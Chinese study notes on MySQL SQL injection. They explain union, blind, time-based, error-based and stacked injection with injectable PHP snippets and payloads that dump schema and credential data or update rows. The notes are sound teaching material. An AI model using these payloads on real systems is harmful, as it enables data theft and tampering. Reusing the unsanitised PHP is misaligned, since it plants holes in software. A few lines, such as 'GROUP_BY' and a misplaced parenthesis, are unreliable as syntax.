# SQL注入

## 何为SQL注入？

网站开发者未对用户输入的数据进行合法性校验，攻击者通过构造恶意参数来实现对数据库的任意操作

## 常见的SQL注入类型有哪几种?

常见的SQL注入主要分为以下五种类型？

1. 联合查询注入(UNION query SQL injection)
2. 基于Boolean的盲注(Boolean-based blind SQL injection)
3. 基于时间的盲注(Time-based blind SQL injection)
4. 基于报错的注入(Error-based SQL injection)
5. 堆叠注入(Stacked queries SQL injection)

## 重要知识点

### 重要函数

| 序号 | 函数                               | 说明                          |
| ---- | ---------------------------------- | ----------------------------- |
| 1    | select @@version;select version(); | 查看数据库版本信息            |
| 2    | show databases;                    | 查看当前所有数据库            |
| 3    | show tables;                       | 查看当前选中数据的所有表信息  |
| 4    | select database();                 | 查看当前选择的数据库          |
| 5    | select user();                     | 查看当前登录的用户            |
| 6    | concat(x1, x2)                     | 连接多个分组或字符串          |
| 7    | group_concat(x)                    | 将同一分组x的值以逗号间隔连接 |
| 8    | Floor(x)                           | 返回最大且不大于x的整数值     |

### 重要库、表

| 序号 | 库、表                      | 说明                                   |
| ---- | --------------------------- | -------------------------------------- |
| 1    | information_schema          | MySql数据库内置表之一,存有数据库元数据 |
| 2    | performance_schema          | MySql数据库内置表之一，用于性能分析    |
| 3    | information_schema.schemata |                                        |



## 联合注入查询(Union query SQL injection)

使用union构造恶意语句，将需要的信息与当前表信息联合回显到前端界面

联合注入查询主要分为两类

1. 数字型注入
2. 字符型注入

数字型注入

```php
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);
```

字符型注入

```php
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);
```

1. 判断依据

   1. 数字型: id = 1 + 2
   2. 字符型: id = 1', id = 1"

2. 整体利用流程

   1. 字段数判断

      ```sql
      id = 1 order by 2
      ```

   2. 回显点判断

      ```sql
      id = -1 union select 1,2,3
      ```

   3. 暴库

      ```sql
      id = -1' union select 1,2,schema_name from information_schema.schemata where schema_name = database() --+
      ```

   4. 暴表

      ```sql
      id = -1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = database() --+
      ```

   5. 暴字段名

      ```sql
      id = -1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name = '表名' -- +
      ```

   6. 暴数据

      ```sql
      id = 1' union select 1,2,group_concat(username, passwd) from '表名' --+
      ```

特征

1. union字段的使用
2. 存在回显点

## 基于Boolean的盲注(Boolean-based blind SQL injection)

1. 没有具体的错误回显信息

2. 页面根据参数是否合法，会返回不同的页面

3. 判断依据

   ```sql
   id = 1' and substr(version(), 1, 1) > 5 --+
   ```

4. 利用方法

   ```sql
   id = 1' and ord(substr((select database()), 1, 1)) > 95 --+
   ```

## 基于Time的盲注(Time-based blind SQL injection)

1. 没有具体的错误回显信息

2. 只能依靠物理感观来判断是否存在注入点

3. 判断依据

   ```sql
   id = 1 and sleep(2) --+
   ```

4. 利用方法

   ```sql
   id = 1 and if(ord(substr((select database()), 1, 1)) > 95, 1, sleep(2))--+
   ```

特殊说明: select sleep(2);值为0

## 错误型注入(Error-based SQL injection)

1. 存在错误回显
2. 往往是利用的是MySQL逻辑漏洞

MySQL错误注入类型主要有:

1. BigInt等数据类型溢出
2. Xpath语法错误
3. count() + rand() + group_by()导致的重复
4. 空间数据类型函数错误

MySQL报错利用的一些函数:

1. floor()
2. extractvalue()最多32字符
3. updatexml()
4. exp()

```sql
Rand([N])
Returns a random floating-point value v in the range 0 <= v < 1.0.
Rand()给定了N之后为伪随机数
SELECT rand(0) FROM information_schema.tables LIMIT 0, 10;
SELECT Count(*), Floor(Rand(0) * 2)x FROM information_schema.tables LIMIT 0, 10 GROUP_BY x;

ExtractValue(xml_frag, xpath_expr)		使用XPath表示法从XML字符串中提取值(最多32字符)
SELECT ExtractValue('<a><b>value</b></a>', '/a/b');
ExtractValue(1, @@version)
ExtractValue(1, Concat(0x7e, (SELECT @@version))) 0x7d 0x7f ... concat无法处理的字符

UpdateXML(xml_target, xpath_expr, new_xml) 返回替代的XML片段
SELECT UpdateXML('<a><b></a></a>', '/a/b', 'c')
UpdateXML(1, Concat(0x7e, (SELECT @@version), 1))
UpdateXML会将无法理解的xpath_expr以报错的形式显示出来
@@version 8.0.021 8.0被当作数字， .21无法理解，爆出.21错误

Concat()连接多个字符串
Concat(0x7e, @@version)让其一开始无法正常解析
UpdateXML(1, Concat(0x7e, (SELECT schema_name FROM information_schema.schemata WHERE schema_name = DataBase())), 1)

EXP(~(SELECT * FROM (SELECT DataBase())x))		以e为底的指数函数
rand(0) * 2		固定值011011
SELECT * FROM (SELECT Count(*), Concat(table_name, Floor(Rand(0)*2))x FROM information_schema.tables GROUP_BY x)a;
```

[exp]('https://osandamalith.com/2015/07/15/error-based-sql-injection-using-exp/')

## 堆叠注入(Stacked queries SQL injection)

与union注入不同的是，堆叠注入一次性可注入多条语句，但堆叠注入无法看到语句执行后的回显

不足点：

不是每一个环境都能使用，数据库API版本、权限问题都会影响堆叠注入。

存在的问题：

1. 通常只返回一个结果，跟随语句产生的错误或结果只能被忽略，前端无法看到这些结果。
2. 需要知道数据库的一些信息。

```sql
id=1';update users set username = '李四' where username = '张三';--+
```

